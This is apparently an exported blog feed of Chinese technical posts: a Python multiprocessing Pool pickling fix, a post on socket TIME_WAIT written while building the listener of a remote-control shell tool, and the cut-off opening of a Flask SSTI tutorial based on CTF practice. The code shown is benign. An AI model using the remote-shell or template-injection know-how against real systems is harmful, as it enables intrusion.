ERROR：error，记录程序的报错信息</li></ol><p>可根据需求将日志拆分，保存SCMD记录，即可查看所有历史查询记录。</p><h3 id="🔑地址"><a href="#🔑地址" class="headerlink" title="🔑地址"></a>🔑地址</h3><p>Github地址：<a href="https://github.com/Sma11New/HunterExport">https://github.com/Sma11New/HunterExport</a></p><p><strong>欢迎使用</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> 工具篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 资产测绘 </tag>
            
            <tag> 全球鹰数据导出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决Python Class中进程池Pool对象无法作为类属性进行传递问题</title>
      <link href="post/20210152133.html"/>
      <url>post/20210152133.html</url>
      
        <content type="html"><![CDATA[<p>在使用Python的多进程模块multiprocessing的进程池Pool进行多进程操作时，当在类中把进程池Pool设为类属性<code>self.pool = Pool()</code>，同时把self作为参数传给进程池中的函数的时候会报错（<code>NotImplementedError: pool objects cannot be passed between processes or pickled</code>）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tests</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, numList</span>):</span></span><br><span class="line">        self.numList = numList</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">printTest</span>(<span class="params">self, num</span>):</span></span><br><span class="line">        print(num)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">    self.pool = Pool()</span><br><span class="line">        self.pool.<span class="built_in">map</span>(self.printTest, self.numList)</span><br><span class="line">        self.pool.close()</span><br><span class="line">        self.pool.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    numList = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">    Tests(numList).run()</span><br></pre></td></tr></table></figure><p>报错：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;E:/3.PythonProject/myTool/Source/networkScan/tcpScan.py&quot;, line 162, in &lt;module&gt;</span><br><span class="line">    Tests(numList).run()</span><br><span class="line">  File &quot;E:/3.PythonProject/myTool/Source/networkScan/tcpScan.py&quot;, line 145, in run</span><br><span class="line">    self.pool.map(self.printTest, self.numList)</span><br><span class="line">  File &quot;C:\Users\13714\AppData\Local\Programs\Python\Python37\lib\multiprocessing\pool.py&quot;, line 268, in map</span><br><span class="line">    return self._map_async(func, iterable, mapstar, chunksize).get()</span><br><span class="line">  File &quot;C:\Users\13714\AppData\Local\Programs\Python\Python37\lib\multiprocessing\pool.py&quot;, line 657, in get</span><br><span class="line">    raise self._value</span><br><span class="line">  File &quot;C:\Users\13714\AppData\Local\Programs\Python\Python37\lib\multiprocessing\pool.py&quot;, line 431, in _handle_tasks</span><br><span class="line">    put(task)</span><br><span class="line">  File &quot;C:\Users\13714\AppData\Local\Programs\Python\Python37\lib\multiprocessing\connection.py&quot;, line 206, in send</span><br><span class="line">    self._send_bytes(_ForkingPickler.dumps(obj))</span><br><span class="line">  File &quot;C:\Users\13714\AppData\Local\Programs\Python\Python37\lib\multiprocessing\reduction.py&quot;, line 51, in dumps</span><br><span class="line">    cls(buf, protocol).dump(obj)</span><br><span class="line">  File &quot;C:\Users\13714\AppData\Local\Programs\Python\Python37\lib\multiprocessing\pool.py&quot;, line 535, in __reduce__</span><br><span class="line">    &#x27;pool objects cannot be passed between processes or pickled&#x27;</span><br><span class="line">NotImplementedError: pool objects cannot be passed between processes or pickled</span><br></pre></td></tr></table></figure><p>报错提示，<strong>Pool池对象不能够在进程间传递或不能被pickle</strong>，pickle是Python中的序列化模块，跟其它语言一样，当需要对对象进行持久化存储时，就会用到序列化和反序列化，在php和java中序列化的结果是人类可读的Json串，而pickle结果是人类无法识别的数据，这也起到了私有的作用。</p><p>当pickle序列化实例方法时，Python需要pickle整个对象，包括它的实例变量。这些实例变量之一是对象本身，而Pool对象不能进行pickle，因此出现错误。至于Pool对象为什么不能被pickle，本菜还未搞清楚。</p><p>查询+探索得知，目前大致有以下几种解决方案</p><h3 id="方法一：指定Pool对象不被pickle"><a href="#方法一：指定Pool对象不被pickle" class="headerlink" title="方法一：指定Pool对象不被pickle"></a>方法一：指定Pool对象不被pickle</h3><p>当pickle实例方法时，Python需要pickle整个对象，如果将Pool对象写入类属性进行传递，则也包括Pool对象，此时可以通过在对象上实现<code>__getstate__</code>魔术方法，并使用它在pickle之前从实例中删除Pool对象来解决此问题。</p><p>这里涉及到和pickle有关的两个魔术方法：</p><ul><li><code>__getstate__</code></li><li><code>__setstate__(state)</code></li></ul><p><code>__getstate__</code>总是在pickle对象之前被调用，它允许你指定对象状态的哪一部分实际上应该被pickle。然后在unpickle时，<code>__setstate__(state)</code>将被调用，如果它实现了(在我们的例子中)，或者如果它没有，由<code>__getstate__</code>返回的dict将被用作unpickle实例的<code>__dict__</code>。在上面的例子中，我们显式地设置了dict的<code>__dict__</code>，我们在<code>__getstate__</code>返回，但我们本可以不实现<code>__setstate__</code>和得到相同的效果。</p><p>加入<code>__getstate__</code>和<code>__setstate__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tests</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, numList</span>):</span></span><br><span class="line">        self.numList = numList</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">printTest</span>(<span class="params">self, num</span>):</span></span><br><span class="line">        print(num)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.pool = Pool()</span><br><span class="line">        self.pool.<span class="built_in">map</span>(self.printTest, self.numList)</span><br><span class="line">        self.pool.close()</span><br><span class="line">        self.pool.join()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getstate__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self_dict = self.__dict__.copy()</span><br><span class="line">        <span class="keyword">del</span> self_dict[<span class="string">&#x27;pool&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> self_dict</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setstate__</span>(<span class="params">self, state</span>):</span></span><br><span class="line">        self.__dict__.update(state)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    numList = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">    Tests(numList).run()</span><br></pre></td></tr></table></figure><p>可成功执行，输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure><p>在这两个魔术方法中添加输出代码，查看每次执行后的pickle对象内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__getstate__</span>(<span class="params">self</span>):</span></span><br><span class="line">    self_dict = self.__dict__.copy()</span><br><span class="line">    print(self.__dict__)</span><br><span class="line">    <span class="keyword">del</span> self_dict[<span class="string">&#x27;pool&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> self_dict</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__setstate__</span>(<span class="params">self, state</span>):</span></span><br><span class="line">    self.__dict__.update(state)</span><br><span class="line">    print(self.__dict__)</span><br></pre></td></tr></table></figure><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2021/01/05/1609817181.png" alt="1608635655066.png"></p><p>通过打印可知，使用<code>del self_dict[&#39;pool&#39;]</code>后将字典中的Pool对象删除，然后再将得到的字典传给<code>__setstate__(self, state)</code>，这样pickle的内容就不会包含Pool对象。</p><h3 id="方法二：使用pathos模块代替multiprocessing的Pool"><a href="#方法二：使用pathos模块代替multiprocessing的Pool" class="headerlink" title="方法二：使用pathos模块代替multiprocessing的Pool"></a>方法二：使用pathos模块代替multiprocessing的Pool</h3><p>pip安装pathos并行计算模块，使用pathos模块的ProcessPool来代替multiprocessing的Pool：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathos.pools <span class="keyword">import</span> ProcessPool <span class="keyword">as</span> Pool</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tests</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, numList</span>):</span></span><br><span class="line">        self.numList = numList</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">printTest</span>(<span class="params">self, num</span>):</span></span><br><span class="line">        print(num)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.pool = Pool()</span><br><span class="line">        self.pool.<span class="built_in">map</span>(self.printTest, self.numList)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    numList = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">    Tests(numList).run()</span><br></pre></td></tr></table></figure><p>可成功执行，输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure><h3 id="方法三：不将Pool对象写入类属性"><a href="#方法三：不将Pool对象写入类属性" class="headerlink" title="方法三：不将Pool对象写入类属性"></a>方法三：不将Pool对象写入类属性</h3><p>上文提到，当pickle实例方法时，Python需要pickle整个对象，如果将Pool对象写入类属性进行传递，则也包括Pool对象。因此修改代码，将Pool对象单独写进run函数，而不写入类属性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tests</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, numList</span>):</span></span><br><span class="line">        self.numList = numList</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">printTest</span>(<span class="params">self, num</span>):</span></span><br><span class="line">        print(num)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        pool = Pool()<span class="comment"># 不写入类属性</span></span><br><span class="line">        pool.<span class="built_in">map</span>(self.printTest, self.numList)</span><br><span class="line">        pool.close()</span><br><span class="line">        pool.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    numList = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">    Tests(numList).run()</span><br></pre></td></tr></table></figure><p>可成功执行，输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure><h3 id="方法四：使用-staticmethod静态装饰器"><a href="#方法四：使用-staticmethod静态装饰器" class="headerlink" title="方法四：使用@staticmethod静态装饰器"></a>方法四：使用@staticmethod静态装饰器</h3><p>源自Stack Overflow上师傅的回答，回答中提到的Dano’s answer其实就是上述方法一</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2021/01/05/1609817192.png" alt="1608640733012.png"></p><p>@staticmethod称为静态装饰器，通常类方法需要在实例化类之后才可调用，而加了静态修饰符后的函数，不需要实例化类即可调用，直接<code>类名.方法名()</code>即可，这是因为静态装饰器其实是对外部函数的静态封装，函数内部并不需要表示自身对象的self和自身类的cls参数。</p><p>为printTest()函数添加装饰器，run()中正常创建Pool类属性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tests</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, numList</span>):</span></span><br><span class="line">        self.numList = numList</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">printTest</span>(<span class="params">num</span>):</span></span><br><span class="line">        print(num)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.pool = Pool()</span><br><span class="line">        self.pool.<span class="built_in">map</span>(self.printTest, self.numList)</span><br><span class="line">        self.pool.close()</span><br><span class="line">        self.pool.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    numList = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">    Tests(numList).run()</span><br></pre></td></tr></table></figure><p>可成功执行，输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure><h3 id="方法五：声明全局变量pool-Pool"><a href="#方法五：声明全局变量pool-Pool" class="headerlink" title="方法五：声明全局变量pool = Pool()"></a>方法五：声明全局变量pool = Pool()</h3><p>与方法二对应的是，可以通过global来在外部声明一个全局的变量<code>pool = Pool()</code>，同样可以实现，但是此方法不够模块化，感jio偏离了面向对象的思维</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tests</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, numList</span>):</span></span><br><span class="line">        self.numList = numList</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">printTest</span>(<span class="params">self, dstPort</span>):</span></span><br><span class="line">        print(dstPort)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        pool.<span class="built_in">map</span>(self.printTest, self.numList)</span><br><span class="line">        pool.close()</span><br><span class="line">        pool.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">global</span> pool<span class="comment"># 声明一个全局变量</span></span><br><span class="line">    pool = Pool()</span><br><span class="line">    numList = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">    Tests(numList).run()</span><br></pre></td></tr></table></figure><p>可成功执行，输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure><h3 id="方法六：使用ThreadPool代替multiprocessing-Pool"><a href="#方法六：使用ThreadPool代替multiprocessing-Pool" class="headerlink" title="方法六：使用ThreadPool代替multiprocessing.Pool"></a>方法六：使用ThreadPool代替multiprocessing.Pool</h3><p>使用<code>multiprocessing.pool 的 ThreadPool</code>代替<code>multiprocessing.Pool</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> ThreadPool <span class="keyword">as</span> Pool</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tests</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, numList</span>):</span></span><br><span class="line">        self.numList = numList</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">printTest</span>(<span class="params">self, num</span>):</span></span><br><span class="line">        print(num)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.pool = Pool()</span><br><span class="line">        self.pool.<span class="built_in">map</span>(self.printTest, self.numList)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    numList = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">    Tests(numList).run()</span><br></pre></td></tr></table></figure><p> 因为 ThreadPool 与主线程共享内存，而不是创建新进程，这意味着不需要被pickle。 </p><p>但是这种方式会触发GIL，不能充分利用CPU资源。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://stackoverflow.com/questions/25382455/python-notimplementederror-pool-objects-cannot-be-passed-between-processes">https://stackoverflow.com/questions/25382455/python-notimplementederror-pool-objects-cannot-be-passed-between-processes</a></p><p><strong>pickle：</strong><a href="https://www.cnblogs.com/cobbliu/archive/2012/09/04/2670178.html">https://www.cnblogs.com/cobbliu/archive/2012/09/04/2670178.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python进程池 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows和Linux上socket的终止问题（time_wait）</title>
      <link href="post/20201222133.html"/>
      <url>post/20201222133.html</url>
      
        <content type="html"><![CDATA[<p>在编写远控工具DanceShell的shell连接部分，功能需求是当本次连接终止时，自动启动socket监听，依然是在此前的IP和端口进行监听，并且在监听前关闭socket连接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clientSocket.shutdown(2)</span><br><span class="line">clientSocket.close()</span><br></pre></td></tr></table></figure><p>此时在Windows上运行并断开重复监听时是成功的：</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image1.png" alt="image1"></p><p>但是同样的项目代码，在Linux就会报错：</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image2.png" alt="image2"></p><p>抛出来这样的错误：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;server.py&quot;, line 67, in &lt;module&gt;       </span><br><span class="line">    main()           </span><br><span class="line">  File &quot;server.py&quot;, line 35, in main </span><br><span class="line">    server, clientSocket, clientAddress = connect(host, port)</span><br><span class="line">  File &quot;server.py&quot;, line 19, in connect</span><br><span class="line">    server.bind((serverHost, serverPort))</span><br><span class="line">OSError: [Errno 98] Address already in use</span><br></pre></td></tr></table></figure><p>报错显示地址已经被使用，无法再次进行socket bind()绑定。</p><p>起初以为是仅仅终止了clientSocket而没有结束（关闭）serverSocket，于是在关闭clientSocket后又加入一行关闭serverSocket的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">clientSocket.shutdown(2)</span><br><span class="line">clientSocket.close()</span><br><span class="line">server.close()</span><br></pre></td></tr></table></figure><p>Windows上同样可以，但是Linux上运行，关闭再次监听依然会报错。</p><p>当我以为仅仅是Windows和Linux不同操作系统上的socket存在差异时，查询资料得知，Windows和Linux上第一次关闭socket连接并<strong>不会立即释放地址和端口</strong>，也就是不会立即释放该socket（ip:port），而是处于<strong>time_wait</strong>的一个状态</p><p>关于该状态的含义，书籍《TCP/IP详解卷》中给出的解释是，由于TCP连接存在一个最大段生存期MSL（Maximum Segment Lifetime），它代表任何报文段在被丢弃前在网络中被允许存在的最大时长，而当连接断开时，为了防止可能存在于网络中的的数据包，在重新建立新连接后被当作新连接的数据报文，所以会设定一个time_wait，也称之为2MSL，即时长是MSL的2倍。所以<strong>在这2MSL的time_wait时间内，该地址端口不允许再次绑定使用</strong>。</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image3.png" alt="image3"></p><p>Windows上time_wait的时间是30-300s，不同的版本有不同的默认值，所以不能够立即再次绑定此前的端口（socket），当遇到以下两种情况时，才会完全释放：</p><ul><li>1、程序结束</li><li>2、time_wait结束</li></ul><p>但是，由于在实际应用中，服务端同一服务所监听的端口通常是固定的，比如80、443等，如果服务端终止了已经建立连接的服务器进程，此时需要立刻恢复监听，而TCP处于time_wait状态，无法立刻再次监听相同端口，需要等待2MSL，这会大大降低服务器的效率，影响正常的服务。所以针对此问题，之后又提出了<strong>socket地址复用</strong>（<code>SO_REUSEADDR</code>）。</p><p><code>SO_REUSEADDR</code>地址复用就是为了绕过time_wait这个2MSL等待时间而设定的选项，所以它的作用范围仅仅是出于time_wait状态的socket。在bind()之前<strong>使用setsockopt()函数来设定socket参数</strong>，Python示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>在服务器端加入该代码，代码块部分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span>(<span class="params">host, port</span>):</span></span><br><span class="line">  serverHost = host</span><br><span class="line">  serverPort = port</span><br><span class="line">  server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">  server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">  server.bind((serverHost, serverPort))</span><br><span class="line">  server.listen(<span class="number">5</span>)</span><br><span class="line">  msg = <span class="string">&quot; Server is Listening &lt;%s:%s&gt;\n  Waiting……&quot;</span> % (serverHost, serverPort)</span><br><span class="line">  print(Colors.CYAN + <span class="string">&quot;[*]&quot;</span> + Colors.END + msg)</span><br><span class="line">  clientSocket, clientAddress = server.accept()</span><br></pre></td></tr></table></figure><p>此时再次在Linux上进行测试，成功监听</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202110191908243.png" alt="image4"></p><p>除了SO_REUSEADDR，还有SO_REUSEPORT，具体的区别可以参考</p><p><a href="https://www.jianshu.com/p/a23b7e8a4c6a">https://www.jianshu.com/p/a23b7e8a4c6a</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><strong>参考：</strong></p><p><a href="https://www.cnblogs.com/hqutcy/p/7142121.html">https://www.cnblogs.com/hqutcy/p/7142121.html</a></p><p><a href="https://book.douban.com/reading/33303128/">https://book.douban.com/reading/33303128/</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCP/IP time_wait </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python Flask 服务端模板注入(SSTI)</title>
      <link href="post/202010282133.html"/>
      <url>post/202010282133.html</url>
      
        <content type="html"><![CDATA[<p>与SQL注入、XSS等安全漏洞一样，SSTI（Server Site Template Injection）也是因为对用户输入过滤不当导致的，当然还有其他原因，如今的动态站点都会用到模板渲染，这就会有SSTI的风险。</p><p>Python服务端模板注入是相对Flask框架而言的，之前并没有用过该Web框架，是在做XCTF中碰到这类漏洞相关题目，于是现学现卖，写一篇SSTI的学习总结，顺便写出XCTF中两道与该漏洞相关题目的WriteUp</p><h3 id="一、Flask基础"><a href="#一、Flask基础" class="headerlink" title="一、Flask基础"></a>一、Flask基础</h3><p>Flask是python中的一个轻量级Web框架，能够很轻易搭建一个Web站点，使用Jinja2作为模板引擎。</p><p>所谓模板引擎就是在动态站点中，将显示内容和用户数据分离，不同用户查看同一页面返回的是自己的用户数据通过模板渲染后的页面内容，所以一般模板文件都是标准的HTML文件。</p><p>Flask默认的Jinja2引擎存在以下三种语法：</p><ul><li><p> 控制结构 <code>&#123;% %&#125;</code> </p></li><li><p> 变量取值 <code>&#123;&#123; &#125;&#125;</code> </p></li><li><p>注释 <code>&#123;# #&#125;</code> </p><p>使用 <strong><code>&#123;&#123; &#125;&#125;</code></strong> 语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换 。<strong>如果 <code>&#123;&#123; &#125;&#125;</code> 中的内容是用户可控的，那么输入的恶意数据就会带入并执行，造成SSTI。</strong></p></li></ul><p>下面是一个简单的模板文件示例</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 